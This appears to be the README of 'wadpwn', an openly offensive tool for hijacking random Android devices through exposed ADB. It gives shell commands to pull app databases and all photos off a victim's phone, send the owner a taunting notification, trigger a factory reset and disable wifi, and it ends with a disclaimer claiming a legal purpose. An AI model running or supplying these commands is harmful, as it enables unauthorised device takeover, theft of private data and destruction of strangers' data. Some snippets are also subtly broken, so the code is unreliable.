# wadpwn

**It's true** - We can takeover a  device within seconds and get a proxy or steal anything or whatever!

Hack random android device with 100% guarantee to succeed within 1 second.

![wadpwn](https://user-images.githubusercontent.com/26827453/176798498-2e017de5-6bb4-4b8b-a5b1-e86ffd438276.gif)

### Get Started On Linux/MacOSX
 
    git clone https://github.com/wuseman/wadbpwn
    cd wadbpwn
    chmod +x wadb*
    bash ./wadbpwn.sh
    
    - Wait ~1 second
    
    Target has been pwned!

    Enjoy ;-)

### Get Started On Windows 10

    Install any linux distro from microsoft store and run commands above..

### Steal all databases from the device ( require root )

    which su &> /dev/null
    if [[ $? -eq "0" ]]; then
       adb pull /data/data/ /some/path
    else
       printf "* No root detected, just try another target..\n"
       exit 1
    fi

### Steal all pictures: 

    PICS="$(adb shell 'su -c find / \( -name '*.png' -name '*.jpg*' \)')"
    for pictures in $PICS; do
       adb pull -p $PICS /some/folder
     done
    printf "Done..is it your lucky day? ;-)\n"

### Let the owner know that you have hacked him, send a push notice:

    adb shell am broadcast -a com.google.android.c2dm.intent.RECEIVE -n <your.app.package>/com.google.android.gms.gcm.GcmReceiver --es "You h4v3 b33n h3cked mat3" "hrhr!"

### For be an d*ck and do a factory reset of the device: 

    adb shell am broadcast -a android.intent.action.MASTER_CLEAR
    adb shell reboot 

### For be device owners hero for a day you should shut down the targets wifi connection, but why? 

    adb shell svc wifi disable

### System requirements

- Android Debug Bridge (adb) - Find more info about _adb_ [here](https://developer.android.com/studio/command-line/adb)

### Author: 

* **wuseman <wuseman@nr1.nu\>** 

### Contact

  If you have problems, questions, ideas or suggestions please contact me on the e-email under _Authors_ or you can chat with me for faster contact by visit freenode chat and type '/msg wuseman hi!' in the input bar and I will reply you ASAP I will see the message.
  
  Enter Freenode chat via your own client or use the web client by visit this ![page](https://webchat.freenode.net/)

### Haters Gonna Hate

  wuseman cannot be held as responsible for users actions regardless of what damage a user can do. All users that  gathering information or data via wadbpwn is 100% responsible for their own actions, wadbpwn has been developed for a legal purpose.


